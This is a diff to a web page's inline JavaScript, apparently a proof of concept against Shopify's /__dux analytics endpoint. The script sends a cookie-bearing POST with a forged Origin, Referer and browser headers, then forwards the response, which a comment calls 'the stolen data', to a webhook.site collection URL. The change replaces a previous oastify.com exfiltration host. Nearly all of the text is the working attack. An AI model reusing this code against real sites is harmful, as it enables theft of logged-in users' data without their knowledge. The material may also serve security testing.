@@ -10,18 +10,52 @@
     <script>
         // Function to send a request to Shopify's __dux endpoint
         function fetchShopifyData() {
-            fetch('https://www.shopify.com/__dux', {
-                method: 'POST', // Assuming POST method based on response headers
+            const body = JSON.stringify({
+                "multiTrackToken": "e5709659-92e4-4ff7-bb1e-1bacefe631a7",
+                "sessionToken": "8787630b1827-de0d-416e-b691-538c99025d82",
+                "enableActiveConsent": "granularCompact",
+                "enableProtoEventForwarding": false,
+                "events": [
+                    {
+                        "schemaId": "website_web_vitals_event/2.1",
+                        "payload": {
+                            "page_view_token": "9d283c33-64f8-4961-b855-992e2bfcebfe",
+                            "first_contentful_paint": 4120,
+                            "time_to_first_byte": 599
+                        },
+                        "options": {
+                            "convertEventCase": false
+                        },
+                        "metadata": {
+                            "eventCreatedAtMs": 1759270559787,
+                            "clientMessageId": "018ef31f-6b39-43f3-ac8c-06479f499841"
+                        }
+                    }
+                ]
+            });
+
+            fetch('/__dux', {
+                method: 'POST',
                 credentials: 'include', // Include cookies in the request
                 headers: {
                     'Content-Type': 'application/json',
-                    'Origin': 'https://radinrodrigo.github.io/hello' // Set the Origin header
-                }
+                    'Origin': 'https://aolkxrwmkvra.com',
+                    'Referer': 'https://www.shopify.com/',
+                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-US;q=0.9,en;q=0.8',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Cache-Control': 'max-age=0',
+                    'Sec-Ch-Ua': '"Google Chrome";v="138", "Not=A?Brand";v="8", "Chromium";v="138"',
+                    'Sec-Ch-Ua-Platform': '"Linux"',
+                    'Sec-Ch-Ua-Mobile': '?0'
+                },
+                body: body
             })
             .then(response => response.text()) // Read the response as text
             .then(data => {
                 // Send the stolen data to the webhook.site URL
-                fetch('zx0i5f6f5l58jv9qy9du8qu950brzjn8.oastify.com', {
+                fetch('https://webhook.site/a19d392d-53de-4461-b463-29aac0824a7a', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
